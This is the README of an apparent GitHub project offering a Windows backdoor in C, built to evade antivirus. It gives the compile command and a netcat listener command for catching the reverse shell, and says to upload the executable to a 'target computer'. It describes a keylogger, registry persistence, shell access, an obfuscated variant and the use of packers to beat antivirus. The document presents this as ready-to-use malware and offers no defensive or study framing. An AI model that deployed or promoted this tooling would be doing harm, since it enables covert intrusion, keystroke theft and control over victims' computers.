# BACKDOOR-C

![alt text](https://github.com/leo9722/backdoor-c/img/backdoor.png)

 Project to create a backdor undetectable to antivirus software  (before passage under total virus)

# INSTALLATION

To use the backdoor you can use the following command to compile it:

`i686-w64-mingw32-gcc -o test.exe back.c -lwsock32 -lwininet`

Replace test.exe by the name you want to call your executable file and your backdoor will be create  !

Then upload the backdoor on the target computer

Launch a listner on your computer using the port you choose:

```bash
example with netcat  : nc -nlvp 4444
```

Finally launch your executable file and you will see a response of your backdoor on yout listener ! 

# The project :

The backdoor is functional under Windows and includes a persistent mode, a keylogger and a shell access.

I also put a 2nd version who is the same backdoor but obfuscate.

if you using packer you may have a better resistance to A.V !

## Command to use it 

- cd : to move another directory when you gain access to your shell
- persist : to use the persist mode and create an HKEY_CURRENT_KEY
- keylog : ton activate the keylogger
